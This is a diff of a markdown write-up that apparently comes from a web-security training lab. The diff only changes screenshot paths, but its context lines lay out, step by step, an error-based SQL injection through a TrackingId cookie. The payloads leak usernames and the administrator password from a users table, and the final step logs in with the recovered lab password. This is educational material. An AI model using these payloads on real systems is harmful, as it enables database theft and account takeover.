@@ -14,7 +14,7 @@ step 1
 
 go to proxy => http history => select any Request => then send to repeater
 
-![screnshot](./images/lab13_1.png)
+![screnshot](images/lab13_1.jpg)
 
 step 2
 
@@ -25,7 +25,7 @@ add `'` just after TrackingId
 rackingId=6zYV1IBjiO5WaU1p'
 ```
 
-![screnshot](./images/lab13_2.png)
+![screnshot](images/lab13_2.jpg)
 
 step 3
 
@@ -36,7 +36,7 @@ add `''` just after TrackingId
 rackingId=6zYV1IBjiO5WaU1p''
 ```
 
-![screnshot](./images/lab13_3.png)
+![screnshot](images/lab13_3.jpg)
 
 step 4
 
@@ -46,7 +46,7 @@ add `' AND CAST((SELECT 1) AS int)--`
 TrackingId=6zYV1IBjiO5WaU1p'+AND+CAST((SELECT+1)+AS+int)--
 ```
 
-![screnshot](./images/lab13_4.png)
+![screnshot](images/lab13_4.jpg)
 
 step 5
 
@@ -56,7 +56,7 @@ add `' AND 1=CAST((SELECT 1) AS int)--`
 TrackingId=6zYV1IBjiO5WaU1p'+AND+1%3dCAST((SELECT+1)+AS+int)--
 ```
 
-![screnshot](./images/lab13_5.png)
+![screnshot](images/lab13_5.jpg)
 
 step 6
 
@@ -66,7 +66,7 @@ add `' AND 1=CAST((SELECT username FROM users) AS int)--`
 TrackingId=6zYV1IBjiO5WaU1p'+AND+1%3dCAST((SELECT+username+FROM+users)+AS+int)--
 ```
 
-![screnshot](./images/lab13_6.png)
+![screnshot](images/lab13_6.jpg)
 
 step 7
 
@@ -77,7 +77,7 @@ add `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
 TrackingId%3d'+AND+1%3dCAST((SELECT+username+FROM+users)+AS+int)--
 ```
 
-![screnshot](./images/lab13_7.png)
+![screnshot](images/lab13_7.jpg)
 
 step 8
 
@@ -87,7 +87,7 @@ add `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
 TrackingId='+AND+1%3dCAST((SELECT+username+FROM+users+LIMIT+1)+AS+int)--
 ```
 
-![screnshot](./images/lab13_8.png)
+![screnshot](images/lab13_8.jpg)
 
 step 9
 
@@ -97,11 +97,11 @@ add `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
 TrackingId='+AND+1%3dCAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--
 ```
 
-![screnshot](./images/lab13_9.png)
+![screnshot](images/lab13_9.jpg)
 
 step 10
 
 To solve the lab
 login using `administrator` as username and password `6twusmy93tckofkybx0d`
 
-![screnshot](./images/lab13_10.png)
+![screnshot](images/lab13_10.jpg)
